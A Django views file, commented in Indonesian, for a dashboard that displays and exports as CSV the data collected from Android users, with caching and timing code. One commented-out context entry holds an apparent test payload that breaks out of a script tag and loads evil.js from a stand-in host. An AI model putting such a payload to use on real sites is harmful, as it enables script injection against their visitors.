import csv
import json
import time
from django.shortcuts import render
from django.http import HttpResponse
from django.views import generic, View
from apiServer.models import DataMentah, UserAndroid
from apiServer.serializers import LastData, DataMatangSerializer
from .mymodule import last_chart_x_axis, last_chart_y_axis, write_data, write_data1
from .forms import DownloadData
from django.core.cache import cache

# Create your views here.

home_cache = 'home'
download1_cache = 'download1'
sentinel = object()

class Firstpage (generic.TemplateView):
    template_name = "webServer/firstpage.php"


class Home (View): #TODO Start time dan finish time bisa dihapus setelah pengujian
    def get(self, request, *args, **kwargs):
        start_time = time.time() 
        if cache.get(home_cache, sentinel) is sentinel:
            queryset = UserAndroid.objects.all()
            jumlah_data = DataMentah.objects.all().count()
            data = []
            data_matang = []
            for item in queryset: # Data Mentah Terakhir Setiap User Yang Terdaftar
                try:
                    a = item.data_mentah.all()[0:10]
                    i = 0
                    y = None
                    a_len = len(a)
                    # print(item, "Jumlah data = ", a_len)
                    for x in a:
                        b = x.get_DataMatang()
                        if b == None or x.status_layar == True or x.status_charging == True:
                            i += 1
                        else:
                            # print(item, "ada False")
                            data.append(x)
                            data_matang.append(b)
                            break
                        if y == None and b != None:
                            y = x
                            z = b     
                        if i == a_len and y != None:
                            # print(item, "ada True")
                            data.append(y)
                            data_matang.append(z)
                except Exception as e:
                    print(e)
            jumlah_user = queryset.count()
            serializer = LastData(data, many=True) # Tidak perlu argument 'data=' karena bukan dari json
            data = serializer.data
            serializer = DataMatangSerializer(data_matang, many=True)
            data_matang = serializer.data
            x_axis = last_chart_x_axis()
            y_axis = last_chart_y_axis(x_axis)
            context = {
                'data': json.dumps(data), 
                # 'boma': '</script><script src="https://example.com/evil.js"></script>',
                'jumlah_data': jumlah_data, 
                'jumlah_user': jumlah_user, 
                'x_axis': json.dumps(x_axis), 
                'y_axis': json.dumps(y_axis),
                'data_matang':json.dumps(data_matang)
                }
            cache.set(home_cache, context, 30) #TODO ubah argumen ke 3 untuk pengujian cache
            print("Cache Baru Dibuat")
        else:
            context = cache.get("home")
            print("Cache Berhasil")
        print(f"time elapse = {time.time()-start_time}")
        return render(request, "webServer/home.html", context=context)


class Download (View):
    template = 'webServer/download.html'

    def get(self, request, *args, **kwargs):
        form = DownloadData()
        context = {
            'form': form
        }
        return render(request, self.template, context=context)

    def post(self, request, *args, **kwargs):
        start_time = time.time()
        form = DownloadData(request.POST)
        context = {
            'form': form
        }
        if form.is_valid():
            data = form.cleaned_data['user']
            pk = str(data.id)
            if cache.get(pk, sentinel) is sentinel:
                response = HttpResponse()
                response = HttpResponse(content_type='text/csv')
                response['Content-Disposition'] = f'attachment; filename="{data.uuid}.csv"'
                data = data.data_mentah.all().order_by('-id')  # FIXME jumlahData download
                writer = csv.writer(response)
                write_data(writer, data)  
                cache.set(pk, response, 30)#TODO Pengujian Cache
                print("Cache Set")
            else:
                response = cache.get(pk)
                print("Cache Get")
            print(f"time elapse = {time.time()-start_time}")
            return response
        else:
            print("Form Tidak Valid")
            return render(request, self.template, context=context)


class Download1 (View):
    def get(self, request, *args, **kwargs):
        start_time = time.time()
        if cache.get(download1_cache, sentinel) is sentinel:
            query = DataMentah.objects.all().order_by('-id')[0:2000]  # FIXME jumlahData download
            response = HttpResponse()
            response = HttpResponse(content_type='text/csv')
            response['Content-Disposition'] = 'attachment; filename="GpcDataTerakhir.csv"'
            writer = csv.writer(response)
            write_data1(writer, query)
            cache.set(download1_cache, response, 30) #TODO Pengujian Cache
        else :
            response = cache.get(download1_cache)
        print(f"time elapse = {time.time()-start_time}")
        return response

class About(generic.TemplateView):
    template_name = 'webServer/about.html'

class LoadingTesting (generic.TemplateView):
    template_name = 'webServer/loaderio-ef20125ec056bdc18a134fa5dba940f4.txt'